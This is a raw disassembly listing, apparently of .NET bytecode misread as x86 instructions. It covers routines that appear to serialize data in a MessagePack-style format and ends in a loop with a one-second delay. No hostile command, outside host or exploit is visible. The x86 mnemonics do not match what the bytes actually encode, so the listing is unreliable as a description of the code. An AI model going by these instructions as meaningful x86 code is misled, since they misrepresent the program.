  403b96:	01 6c 28 6a          	add    %ebp,0x6a(%eax,%ebp,1)
  403b9a:	00 00                	add    %al,(%eax)
  403b9c:	06                   	push   %es
  403b9d:	2a 03                	sub    (%ebx),%al
  403b9f:	02 28                	add    (%eax),%ch
  403ba1:	45                   	inc    %ebp
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	28 6e 00             	sub    %ch,0x0(%esi)
  403ba8:	00 06                	add    %al,(%esi)
  403baa:	2a 03                	sub    (%ebx),%al
  403bac:	02 7b 23             	add    0x23(%ebx),%bh
  403baf:	00 00                	add    %al,(%eax)
  403bb1:	04 74                	add    $0x74,%al
  403bb3:	03 00                	add    (%eax),%eax
  403bb5:	00 1b                	add    %bl,(%ebx)
  403bb7:	28 69 00             	sub    %ch,0x0(%ecx)
  403bba:	00 06                	add    %al,(%esi)
  403bbc:	2a 02                	sub    (%edx),%al
  403bbe:	03 28                	add    (%eax),%ebp
  403bc0:	40                   	inc    %eax
  403bc1:	00 00                	add    %al,(%eax)
  403bc3:	06                   	push   %es
  403bc4:	2a 02                	sub    (%edx),%al
  403bc6:	03 28                	add    (%eax),%ebp
  403bc8:	41                   	inc    %ecx
  403bc9:	00 00                	add    %al,(%eax)
  403bcb:	06                   	push   %es
  403bcc:	2a 03                	sub    (%ebx),%al
  403bce:	28 67 00             	sub    %ah,0x0(%edi)
  403bd1:	00 06                	add    %al,(%esi)
  403bd3:	2a 1e                	sub    (%esi),%bl
  403bd5:	02 28                	add    (%eax),%ch
  403bd7:	50                   	push   %eax
  403bd8:	00 00                	add    %al,(%eax)
  403bda:	06                   	push   %es
  403bdb:	2a 22                	sub    (%edx),%ah
  403bdd:	02 03                	add    (%ebx),%al
  403bdf:	28 4f 00             	sub    %cl,0x0(%edi)
  403be2:	00 06                	add    %al,(%esi)
  403be4:	2a 1e                	sub    (%esi),%bl
  403be6:	02 28                	add    (%eax),%ch
  403be8:	45                   	inc    %ebp
  403be9:	00 00                	add    %al,(%eax)
  403beb:	06                   	push   %es
  403bec:	2a 22                	sub    (%edx),%ah
  403bee:	02 03                	add    (%ebx),%al
  403bf0:	28 42 00             	sub    %al,0x0(%edx)
  403bf3:	00 06                	add    %al,(%esi)
  403bf5:	2a 1e                	sub    (%esi),%bl
  403bf7:	02 28                	add    (%eax),%ch
  403bf9:	46                   	inc    %esi
  403bfa:	00 00                	add    %al,(%eax)
  403bfc:	06                   	push   %es
  403bfd:	2a 22                	sub    (%edx),%ah
  403bff:	02 03                	add    (%ebx),%al
  403c01:	28 53 00             	sub    %dl,0x0(%ebx)
  403c04:	00 06                	add    %al,(%esi)
  403c06:	2a 00                	sub    (%eax),%al
  403c08:	1b 30                	sbb    (%eax),%esi
  403c0a:	03 00                	add    (%eax),%eax
  403c0c:	39 00                	cmp    %eax,(%eax)
  403c0e:	00 00                	add    %al,(%eax)
  403c10:	12 00                	adc    (%eax),%al
  403c12:	00 11                	add    %dl,(%ecx)
  403c14:	02 0a                	add    (%edx),%cl
  403c16:	16                   	push   %ss
  403c17:	0b 06                	or     (%esi),%eax
  403c19:	12 01                	adc    (%ecx),%al
  403c1b:	28 49 00             	sub    %cl,0x0(%ecx)
  403c1e:	00 0a                	add    %cl,(%edx)
  403c20:	02 7b 27             	add    0x27(%ebx),%bh
  403c23:	00 00                	add    %al,(%eax)
  403c25:	04 2d                	add    $0x2d,%al
  403c27:	12 02                	adc    (%edx),%al
  403c29:	02 02                	add    (%edx),%al
  403c2b:	7b 26                	jnp    0x403c53
  403c2d:	00 00                	add    %al,(%eax)
  403c2f:	04 73                	add    $0x73,%al
  403c31:	31 00                	xor    %eax,(%eax)
  403c33:	00 06                	add    %al,(%esi)
  403c35:	7d 27                	jge    0x403c5e
  403c37:	00 00                	add    %al,(%eax)
  403c39:	04 de                	add    $0xde,%al
  403c3b:	0a 07                	or     (%edi),%al
  403c3d:	2c 06                	sub    $0x6,%al
  403c3f:	06                   	push   %es
  403c40:	28 50 00             	sub    %dl,0x0(%eax)
  403c43:	00 0a                	add    %cl,(%edx)
  403c45:	dc 02                	faddl  (%edx)
  403c47:	7b 27                	jnp    0x403c70
  403c49:	00 00                	add    %al,(%eax)
  403c4b:	04 2a                	add    $0x2a,%al
  403c4d:	00 00                	add    %al,(%eax)
  403c4f:	00 01                	add    %al,(%ecx)
  403c51:	10 00                	adc    %al,(%eax)
  403c53:	00 02                	add    %al,(%edx)
  403c55:	00 04 00             	add    %al,(%eax,%eax,1)
  403c58:	24 28                	and    $0x28,%al
  403c5a:	00 0a                	add    %cl,(%edx)
  403c5c:	00 00                	add    %al,(%eax)
  403c5e:	00 00                	add    %al,(%eax)
  403c60:	1e                   	push   %ds
  403c61:	02 7b 24             	add    0x24(%ebx),%bh
  403c64:	00 00                	add    %al,(%eax)
  403c66:	04 2a                	add    $0x2a,%al
  403c68:	32 02                	xor    (%edx),%al
  403c6a:	7b 26                	jnp    0x403c92
  403c6c:	00 00                	add    %al,(%eax)
  403c6e:	04 73                	add    $0x73,%al
  403c70:	2d 00 00 06 2a       	sub    $0x2a060000,%eax
  403c75:	4a                   	dec    %edx
  403c76:	02 73 83             	add    -0x7d(%ebx),%dh
  403c79:	00 00                	add    %al,(%eax)
  403c7b:	0a 7d 26             	or     0x26(%ebp),%bh
  403c7e:	00 00                	add    %al,(%eax)
  403c80:	04 02                	add    $0x2,%al
  403c82:	28 1a                	sub    %bl,(%edx)
  403c84:	00 00                	add    %al,(%eax)
  403c86:	0a 2a                	or     (%edx),%ch
  403c88:	13 30                	adc    (%eax),%esi
  403c8a:	04 00                	add    $0x0,%al
  403c8c:	18 00                	sbb    %al,(%eax)
  403c8e:	00 00                	add    %al,(%eax)
  403c90:	13 00                	adc    (%eax),%eax
  403c92:	00 11                	add    %dl,(%ecx)
  403c94:	03 8d 57 00 00 01    	add    0x1000057(%ebp),%ecx
  403c9a:	0a 02                	or     (%edx),%al
  403c9c:	06                   	push   %es
  403c9d:	16                   	push   %ss
  403c9e:	03 6f 45             	add    0x45(%edi),%ebp
  403ca1:	00 00                	add    %al,(%eax)
  403ca3:	0a 26                	or     (%esi),%ah
  403ca5:	06                   	push   %es
  403ca6:	28 23                	sub    %ah,(%ebx)
  403ca8:	00 00                	add    %al,(%eax)
  403caa:	06                   	push   %es
  403cab:	2a 3a                	sub    (%edx),%bh
  403cad:	02 6f 7a             	add    0x7a(%edi),%ch
  403cb0:	00 00                	add    %al,(%eax)
  403cb2:	0a d2                	or     %dl,%dl
  403cb4:	02 28                	add    (%eax),%ch
  403cb6:	65 00 00             	add    %al,%gs:(%eax)
  403cb9:	06                   	push   %es
  403cba:	2a 00                	sub    (%eax),%al
  403cbc:	13 30                	adc    (%eax),%esi
  403cbe:	04 00                	add    $0x0,%al
  403cc0:	99                   	cltd
  403cc1:	00 00                	add    %al,(%eax)
  403cc3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403cc6:	00 11                	add    %dl,(%ecx)
  403cc8:	14 0a                	adc    $0xa,%al
  403cca:	16                   	push   %ss
  403ccb:	0b 02                	or     (%edx),%eax
  403ccd:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  403cd3:	12 02                	adc    (%edx),%al
  403cd5:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  403cdb:	0a 02                	or     (%edx),%al
  403cdd:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  403ce3:	0b 2b                	or     (%ebx),%ebp
  403ce5:	63 02                	arpl   %eax,(%edx)
  403ce7:	20 d9                	and    %bl,%cl
  403ce9:	00 00                	add    %al,(%eax)
  403ceb:	00 33                	add    %dh,(%ebx)
  403ced:	09 03                	or     %eax,(%ebx)
  403cef:	6f                   	outsl  %ds:(%esi),(%dx)
  403cf0:	7a 00                	jp     0x403cf2
  403cf2:	00 0a                	add    %cl,(%edx)
  403cf4:	0b 2b                	or     (%ebx),%ebp
  403cf6:	52                   	push   %edx
  403cf7:	02 20                	add    (%eax),%ah
  403cf9:	da 00                	fiaddl (%eax)
  403cfb:	00 00                	add    %al,(%eax)
  403cfd:	33 22                	xor    (%edx),%esp
  403cff:	18 8d 57 00 00 01    	sbb    %cl,0x1000057(%ebp)
  403d05:	0a 03                	or     (%ebx),%al
  403d07:	06                   	push   %es
  403d08:	16                   	push   %ss
  403d09:	18 6f 45             	sbb    %ch,0x45(%edi)
  403d0c:	00 00                	add    %al,(%eax)
  403d0e:	0a 26                	or     (%esi),%ah
  403d10:	06                   	push   %es
  403d11:	28 26                	sub    %ah,(%esi)
  403d13:	00 00                	add    %al,(%eax)
  403d15:	06                   	push   %es
  403d16:	0a 06                	or     (%esi),%al
  403d18:	16                   	push   %ss
  403d19:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  403d1d:	0a 0b                	or     (%ebx),%cl
  403d1f:	2b 28                	sub    (%eax),%ebp
  403d21:	02 20                	add    (%eax),%ah
  403d23:	db 00                	fildl  (%eax)
  403d25:	00 00                	add    %al,(%eax)
  403d27:	33 20                	xor    (%eax),%esp
  403d29:	1a 8d 57 00 00 01    	sbb    0x1000057(%ebp),%cl
  403d2f:	0a 03                	or     (%ebx),%al
  403d31:	06                   	push   %es
  403d32:	16                   	push   %ss
  403d33:	1a 6f 45             	sbb    0x45(%edi),%ch
  403d36:	00 00                	add    %al,(%eax)
  403d38:	0a 26                	or     (%esi),%ah
  403d3a:	06                   	push   %es
  403d3b:	28 26                	sub    %ah,(%esi)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	06                   	push   %es
  403d40:	0a 06                	or     (%esi),%al
  403d42:	16                   	push   %ss
  403d43:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403d47:	0a 0b                	or     (%ebx),%cl
  403d49:	07                   	pop    %es
  403d4a:	8d 57 00             	lea    0x0(%edi),%edx
  403d4d:	00 01                	add    %al,(%ecx)
  403d4f:	0a 03                	or     (%ebx),%al
  403d51:	06                   	push   %es
  403d52:	16                   	push   %ss
  403d53:	07                   	pop    %es
  403d54:	6f                   	outsl  %ds:(%esi),(%dx)
  403d55:	45                   	inc    %ebp
  403d56:	00 00                	add    %al,(%eax)
  403d58:	0a 26                	or     (%esi),%ah
  403d5a:	06                   	push   %es
  403d5b:	28 23                	sub    %ah,(%ebx)
  403d5d:	00 00                	add    %al,(%eax)
  403d5f:	06                   	push   %es
  403d60:	2a 1e                	sub    (%esi),%bl
  403d62:	02 28                	add    (%eax),%ch
  403d64:	1a 00                	sbb    (%eax),%al
  403d66:	00 0a                	add    %cl,(%edx)
  403d68:	2a 32                	sub    (%edx),%dh
  403d6a:	02 20                	add    (%eax),%ah
  403d6c:	c0 00 00             	rolb   $0x0,(%eax)
  403d6f:	00 6f 62             	add    %ch,0x62(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 2a                	or     (%edx),%ch
  403d76:	00 00                	add    %al,(%eax)
  403d78:	13 30                	adc    (%eax),%esi
  403d7a:	04 00                	add    $0x0,%al
  403d7c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403d7d:	00 00                	add    %al,(%eax)
  403d7f:	00 15 00 00 11 03    	add    %dl,0x3110000
  403d85:	28 22                	sub    %ah,(%edx)
  403d87:	00 00                	add    %al,(%eax)
  403d89:	06                   	push   %es
  403d8a:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  403d8d:	06                   	push   %es
  403d8e:	8e 69 0c             	mov    0xc(%ecx),%gs
  403d91:	16                   	push   %ss
  403d92:	0d 08 1f 1f 30       	or     $0x301f1f08,%eax
  403d97:	13 20                	adc    (%eax),%esp
  403d99:	a0 00 00 00 08       	mov    0x8000000,%al
  403d9e:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  403da1:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403da6:	00 00                	add    %al,(%eax)
  403da8:	0a 2b                	or     (%ebx),%ch
  403daa:	74 08                	je     0x403db4
  403dac:	20 ff                	and    %bh,%bh
  403dae:	00 00                	add    %al,(%eax)
  403db0:	00 30                	add    %dh,(%eax)
  403db2:	19 20                	sbb    %esp,(%eax)
  403db4:	d9 00                	flds   (%eax)
  403db6:	00 00                	add    %al,(%eax)
  403db8:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403dbd:	00 00                	add    %al,(%eax)
  403dbf:	0a 08                	or     (%eax),%cl
  403dc1:	d2 0d 02 09 6f 62    	rorb   %cl,0x626f0902
  403dc7:	00 00                	add    %al,(%eax)
  403dc9:	0a 2b                	or     (%ebx),%ch
  403dcb:	53                   	push   %ebx
  403dcc:	08 20                	or     %ah,(%eax)
  403dce:	ff                   	(bad)
  403dcf:	ff 00                	incl   (%eax)
  403dd1:	00 30                	add    %dh,(%eax)
  403dd3:	27                   	daa
  403dd4:	20 da                	and    %bl,%dl
  403dd6:	00 00                	add    %al,(%eax)
  403dd8:	00 0d 02 09 6f 62    	add    %cl,0x626f0902
  403dde:	00 00                	add    %al,(%eax)
  403de0:	0a 08                	or     (%eax),%cl
  403de2:	68 28 63 00 00       	push   $0x6328
  403de7:	0a 28                	or     (%eax),%ch
  403de9:	26 00 00             	add    %al,%es:(%eax)
  403dec:	06                   	push   %es
  403ded:	0b 02                	or     (%edx),%eax
  403def:	07                   	pop    %es
  403df0:	16                   	push   %ss
  403df1:	07                   	pop    %es
  403df2:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403df5:	4c                   	dec    %esp
  403df6:	00 00                	add    %al,(%eax)
  403df8:	0a 2b                	or     (%ebx),%ch
  403dfa:	24 20                	and    $0x20,%al
  403dfc:	db 00                	fildl  (%eax)
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	0d 02 09 6f 62       	or     $0x626f0902,%eax
  403e05:	00 00                	add    %al,(%eax)
  403e07:	0a 08                	or     (%eax),%cl
  403e09:	28 4a 00             	sub    %cl,0x0(%edx)
  403e0c:	00 0a                	add    %cl,(%edx)
  403e0e:	28 26                	sub    %ah,(%esi)
  403e10:	00 00                	add    %al,(%eax)
  403e12:	06                   	push   %es
  403e13:	0b 02                	or     (%edx),%eax
  403e15:	07                   	pop    %es
  403e16:	16                   	push   %ss
  403e17:	07                   	pop    %es
  403e18:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403e1b:	4c                   	dec    %esp
  403e1c:	00 00                	add    %al,(%eax)
  403e1e:	0a 02                	or     (%edx),%al
  403e20:	06                   	push   %es
  403e21:	16                   	push   %ss
  403e22:	06                   	push   %es
  403e23:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403e26:	4c                   	dec    %esp
  403e27:	00 00                	add    %al,(%eax)
  403e29:	0a 2a                	or     (%edx),%ch
  403e2b:	00 13                	add    %dl,(%ebx)
  403e2d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403e30:	88 00                	mov    %al,(%eax)
  403e32:	00 00                	add    %al,(%eax)
  403e34:	16                   	push   %ss
  403e35:	00 00                	add    %al,(%eax)
  403e37:	11 14 0a             	adc    %edx,(%edx,%ecx,1)
  403e3a:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  403e40:	07                   	pop    %es
  403e41:	20 ff                	and    %bh,%bh
  403e43:	00 00                	add    %al,(%eax)
  403e45:	00 30                	add    %dh,(%eax)
  403e47:	19 20                	sbb    %esp,(%eax)
  403e49:	c4 00                	les    (%eax),%eax
  403e4b:	00 00                	add    %al,(%eax)
  403e4d:	0c 02                	or     $0x2,%al
  403e4f:	08 6f 62             	or     %ch,0x62(%edi)
  403e52:	00 00                	add    %al,(%eax)
  403e54:	0a 07                	or     (%edi),%al
  403e56:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  403e59:	08 6f 62             	or     %ch,0x62(%edi)
  403e5c:	00 00                	add    %al,(%eax)
  403e5e:	0a 2b                	or     (%ebx),%ch
  403e60:	53                   	push   %ebx
  403e61:	07                   	pop    %es
  403e62:	20 ff                	and    %bh,%bh
  403e64:	ff 00                	incl   (%eax)
  403e66:	00 30                	add    %dh,(%eax)
  403e68:	27                   	daa
  403e69:	20 c5                	and    %al,%ch
  403e6b:	00 00                	add    %al,(%eax)
  403e6d:	00 0c 02             	add    %cl,(%edx,%eax,1)
  403e70:	08 6f 62             	or     %ch,0x62(%edi)
  403e73:	00 00                	add    %al,(%eax)
  403e75:	0a 07                	or     (%edi),%al
  403e77:	68 28 63 00 00       	push   $0x6328
  403e7c:	0a 28                	or     (%eax),%ch
  403e7e:	26 00 00             	add    %al,%es:(%eax)
  403e81:	06                   	push   %es
  403e82:	0a 02                	or     (%edx),%al
  403e84:	06                   	push   %es
  403e85:	16                   	push   %ss
  403e86:	06                   	push   %es
  403e87:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403e8a:	4c                   	dec    %esp
  403e8b:	00 00                	add    %al,(%eax)
  403e8d:	0a 2b                	or     (%ebx),%ch
  403e8f:	24 20                	and    $0x20,%al
  403e91:	c6 00 00             	movb   $0x0,(%eax)
  403e94:	00 0c 02             	add    %cl,(%edx,%eax,1)
  403e97:	08 6f 62             	or     %ch,0x62(%edi)
  403e9a:	00 00                	add    %al,(%eax)
  403e9c:	0a 07                	or     (%edi),%al
  403e9e:	28 4a 00             	sub    %cl,0x0(%edx)
  403ea1:	00 0a                	add    %cl,(%edx)
  403ea3:	28 26                	sub    %ah,(%esi)
  403ea5:	00 00                	add    %al,(%eax)
  403ea7:	06                   	push   %es
  403ea8:	0a 02                	or     (%edx),%al
  403eaa:	06                   	push   %es
  403eab:	16                   	push   %ss
  403eac:	06                   	push   %es
  403ead:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403eb0:	4c                   	dec    %esp
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	0a 02                	or     (%edx),%al
  403eb5:	03 16                	add    (%esi),%edx
  403eb7:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  403ebd:	00 0a                	add    %cl,(%edx)
  403ebf:	2a 6a 02             	sub    0x2(%edx),%ch
  403ec2:	20 cb                	and    %cl,%bl
  403ec4:	00 00                	add    %al,(%eax)
  403ec6:	00 6f 62             	add    %ch,0x62(%edi)
  403ec9:	00 00                	add    %al,(%eax)
  403ecb:	0a 02                	or     (%edx),%al
  403ecd:	03 28                	add    (%eax),%ebp
  403ecf:	2a 00                	sub    (%eax),%al
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	16                   	push   %ss
  403ed4:	1e                   	push   %ds
  403ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ed6:	4c                   	dec    %esp
  403ed7:	00 00                	add    %al,(%eax)
  403ed9:	0a 2a                	or     (%edx),%ch
  403edb:	7e 02                	jle    0x403edf
  403edd:	20 ca                	and    %cl,%dl
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	00 6f 62             	add    %ch,0x62(%edi)
  403ee4:	00 00                	add    %al,(%eax)
  403ee6:	0a 02                	or     (%edx),%al
  403ee8:	03 28                	add    (%eax),%ebp
  403eea:	71 00                	jno    0x403eec
  403eec:	00 0a                	add    %cl,(%edx)
  403eee:	28 26                	sub    %ah,(%esi)
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	16                   	push   %ss
  403ef4:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  403ef7:	00 00                	add    %al,(%eax)
  403ef9:	0a 2a                	or     (%edx),%ch
  403efb:	6e                   	outsb  %ds:(%esi),(%dx)
  403efc:	03 2c 0c             	add    (%esp,%ecx,1),%ebp
  403eff:	02 20                	add    (%eax),%ah
  403f01:	c3                   	ret
  403f02:	00 00                	add    %al,(%eax)
  403f04:	00 6f 62             	add    %ch,0x62(%edi)
  403f07:	00 00                	add    %al,(%eax)
  403f09:	0a 2a                	or     (%edx),%ch
  403f0b:	02 20                	add    (%eax),%ah
  403f0d:	c2 00 00             	ret    $0x0
  403f10:	00 6f 62             	add    %ch,0x62(%edi)
  403f13:	00 00                	add    %al,(%eax)
  403f15:	0a 2a                	or     (%edx),%ch
  403f17:	00 13                	add    %dl,(%ebx)
  403f19:	30 04 00             	xor    %al,(%eax,%eax,1)
  403f1c:	21 00                	and    %eax,(%eax)
  403f1e:	00 00                	add    %al,(%eax)
  403f20:	13 00                	adc    (%eax),%eax
  403f22:	00 11                	add    %dl,(%ecx)
  403f24:	02 20                	add    (%eax),%ah
  403f26:	cf                   	iret
  403f27:	00 00                	add    %al,(%eax)
  403f29:	00 6f 62             	add    %ch,0x62(%edi)
  403f2c:	00 00                	add    %al,(%eax)
  403f2e:	0a 03                	or     (%ebx),%al
  403f30:	28 84 00 00 0a 0a 02 	sub    %al,0x20a0a00(%eax,%eax,1)
  403f37:	06                   	push   %es
  403f38:	28 26                	sub    %ah,(%esi)
  403f3a:	00 00                	add    %al,(%eax)
  403f3c:	06                   	push   %es
  403f3d:	16                   	push   %ss
  403f3e:	1e                   	push   %ds
  403f3f:	6f                   	outsl  %ds:(%esi),(%dx)
  403f40:	4c                   	dec    %esp
  403f41:	00 00                	add    %al,(%eax)
  403f43:	0a 2a                	or     (%edx),%ch
  403f45:	00 00                	add    %al,(%eax)
  403f47:	00 13                	add    %dl,(%ebx)
  403f49:	30 04 00             	xor    %al,(%eax,%eax,1)
  403f4c:	1d 01 00 00 00       	sbb    $0x1,%eax
  403f51:	00 00                	add    %al,(%eax)
  403f53:	00 03                	add    %al,(%ebx)
  403f55:	16                   	push   %ss
  403f56:	6a 3f                	push   $0x3f
  403f58:	8a 00                	mov    (%eax),%al
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	03 1f                	add    (%edi),%ebx
  403f5e:	7f 6a                	jg     0x403fca
  403f60:	30 09                	xor    %cl,(%ecx)
  403f62:	02 03                	add    (%ebx),%al
  403f64:	d2 6f 62             	shrb   %cl,0x62(%edi)
  403f67:	00 00                	add    %al,(%eax)
  403f69:	0a 2a                	or     (%edx),%ch
  403f6b:	03 20                	add    (%eax),%esp
  403f6d:	ff 00                	incl   (%eax)
  403f6f:	00 00                	add    %al,(%eax)
  403f71:	6a 30                	push   $0x30
  403f73:	14 02                	adc    $0x2,%al
  403f75:	20 cc                	and    %cl,%ah
  403f77:	00 00                	add    %al,(%eax)
  403f79:	00 6f 62             	add    %ch,0x62(%edi)
  403f7c:	00 00                	add    %al,(%eax)
  403f7e:	0a 02                	or     (%edx),%al
  403f80:	03 d2                	add    %edx,%edx
  403f82:	6f                   	outsl  %ds:(%esi),(%dx)
  403f83:	62 00                	bound  %eax,(%eax)
  403f85:	00 0a                	add    %cl,(%edx)
  403f87:	2a 03                	sub    (%ebx),%al
  403f89:	20 ff                	and    %bh,%bh
  403f8b:	ff 00                	incl   (%eax)
  403f8d:	00 6a 30             	add    %ch,0x30(%edx)
  403f90:	1b 02                	sbb    (%edx),%eax
  403f92:	20 cd                	and    %cl,%ch
  403f94:	00 00                	add    %al,(%eax)
  403f96:	00 6f 62             	add    %ch,0x62(%edi)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	0a 02                	or     (%edx),%al
  403f9d:	03 68 28             	add    0x28(%eax),%ebp
  403fa0:	29 00                	sub    %eax,(%eax)
  403fa2:	00 06                	add    %al,(%esi)
  403fa4:	16                   	push   %ss
  403fa5:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  403fa8:	00 00                	add    %al,(%eax)
  403faa:	0a 2a                	or     (%edx),%ch
  403fac:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  403fb2:	20 ce                	and    %cl,%dh
  403fb4:	00 00                	add    %al,(%eax)
  403fb6:	00 6f 62             	add    %ch,0x62(%edi)
  403fb9:	00 00                	add    %al,(%eax)
  403fbb:	0a 02                	or     (%edx),%al
  403fbd:	03 69 28             	add    0x28(%ecx),%ebp
  403fc0:	28 00                	sub    %al,(%eax)
  403fc2:	00 06                	add    %al,(%esi)
  403fc4:	16                   	push   %ss
  403fc5:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  403fc8:	00 00                	add    %al,(%eax)
  403fca:	0a 2a                	or     (%edx),%ch
  403fcc:	02 20                	add    (%eax),%ah
  403fce:	d3 00                	roll   %cl,(%eax)
  403fd0:	00 00                	add    %al,(%eax)
  403fd2:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd3:	62 00                	bound  %eax,(%eax)
  403fd5:	00 0a                	add    %cl,(%edx)
  403fd7:	02 03                	add    (%ebx),%al
  403fd9:	28 27                	sub    %ah,(%edi)
  403fdb:	00 00                	add    %al,(%eax)
  403fdd:	06                   	push   %es
  403fde:	16                   	push   %ss
  403fdf:	1e                   	push   %ds
  403fe0:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe1:	4c                   	dec    %esp
  403fe2:	00 00                	add    %al,(%eax)
  403fe4:	0a 2a                	or     (%edx),%ch
  403fe6:	03 20                	add    (%eax),%esp
  403fe8:	00 00                	add    %al,(%eax)
  403fea:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  403ff0:	20 d3                	and    %dl,%bl
  403ff2:	00 00                	add    %al,(%eax)
  403ff4:	00 6f 62             	add    %ch,0x62(%edi)
  403ff7:	00 00                	add    %al,(%eax)
  403ff9:	0a 02                	or     (%edx),%al
  403ffb:	03 28                	add    (%eax),%ebp
  403ffd:	27                   	daa
  403ffe:	00 00                	add    %al,(%eax)
  404000:	06                   	push   %es
  404001:	16                   	push   %ss
  404002:	1e                   	push   %ds
  404003:	6f                   	outsl  %ds:(%esi),(%dx)
  404004:	4c                   	dec    %esp
  404005:	00 00                	add    %al,(%eax)
  404007:	0a 2a                	or     (%edx),%ch
  404009:	03 20                	add    (%eax),%esp
  40400b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404011:	1b 02                	sbb    (%edx),%eax
  404013:	20 d2                	and    %dl,%dl
  404015:	00 00                	add    %al,(%eax)
  404017:	00 6f 62             	add    %ch,0x62(%edi)
  40401a:	00 00                	add    %al,(%eax)
  40401c:	0a 02                	or     (%edx),%al
  40401e:	03 69 28             	add    0x28(%ecx),%ebp
  404021:	28 00                	sub    %al,(%eax)
  404023:	00 06                	add    %al,(%esi)
  404025:	16                   	push   %ss
  404026:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404029:	00 00                	add    %al,(%eax)
  40402b:	0a 2a                	or     (%edx),%ch
  40402d:	03 1f                	add    (%edi),%ebx
  40402f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404033:	02 20                	add    (%eax),%ah
  404035:	d1 00                	roll   $1,(%eax)
  404037:	00 00                	add    %al,(%eax)
  404039:	6f                   	outsl  %ds:(%esi),(%dx)
  40403a:	62 00                	bound  %eax,(%eax)
  40403c:	00 0a                	add    %cl,(%edx)
  40403e:	02 03                	add    (%ebx),%al
  404040:	68 28 29 00 00       	push   $0x2928
  404045:	06                   	push   %es
  404046:	16                   	push   %ss
  404047:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a 2a                	or     (%edx),%ch
  40404e:	03 1f                	add    (%edi),%ebx
  404050:	e0 6a                	loopne 0x4040bc
  404052:	30 14 02             	xor    %dl,(%edx,%eax,1)
  404055:	20 d0                	and    %dl,%al
  404057:	00 00                	add    %al,(%eax)
  404059:	00 6f 62             	add    %ch,0x62(%edi)
  40405c:	00 00                	add    %al,(%eax)
  40405e:	0a 02                	or     (%edx),%al
  404060:	03 d2                	add    %edx,%edx
  404062:	6f                   	outsl  %ds:(%esi),(%dx)
  404063:	62 00                	bound  %eax,(%eax)
  404065:	00 0a                	add    %cl,(%edx)
  404067:	2a 02                	sub    (%edx),%al
  404069:	03 d2                	add    %edx,%edx
  40406b:	6f                   	outsl  %ds:(%esi),(%dx)
  40406c:	62 00                	bound  %eax,(%eax)
  40406e:	00 0a                	add    %cl,(%edx)
  404070:	2a 1e                	sub    (%esi),%bl
  404072:	02 28                	add    (%eax),%ch
  404074:	1a 00                	sbb    (%eax),%al
  404076:	00 0a                	add    %cl,(%edx)
  404078:	2a 00                	sub    (%eax),%al
  40407a:	00 00                	add    %al,(%eax)
  40407c:	1b 30                	sbb    (%eax),%esi
  40407e:	06                   	push   %es
  40407f:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  404085:	00 00                	add    %al,(%eax)
  404087:	11 7e 05             	adc    %edi,0x5(%esi)
  40408a:	00 00                	add    %al,(%eax)
  40408c:	04 28                	add    $0x28,%al
  40408e:	85 00                	test   %eax,(%eax)
  404090:	00 0a                	add    %cl,(%edx)
  404092:	7e 06                	jle    0x40409a
  404094:	00 00                	add    %al,(%eax)
  404096:	04 28                	add    $0x28,%al
  404098:	86 00                	xchg   %al,(%eax)
  40409a:	00 0a                	add    %cl,(%edx)
  40409c:	73 87                	jae    0x404025
  40409e:	00 00                	add    %al,(%eax)
  4040a0:	0a 0a                	or     (%edx),%cl
  4040a2:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  4040a8:	89 00                	mov    %eax,(%eax)
  4040aa:	00 0a                	add    %cl,(%edx)
  4040ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ad:	8a 00                	mov    (%eax),%al
  4040af:	00 0a                	add    %cl,(%edx)
  4040b1:	06                   	push   %es
  4040b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b3:	8b 00                	mov    (%eax),%eax
  4040b5:	00 0a                	add    %cl,(%edx)
  4040b7:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  4040be:	02 00                	add    (%eax),%al
  4040c0:	00 16                	add    %dl,(%esi)
  4040c2:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  4040c5:	10 20                	adc    %ah,(%eax)
  4040c7:	e8 03 00 00 28       	call   0x284040cf
  4040cc:	14 00                	adc    $0x0,%al
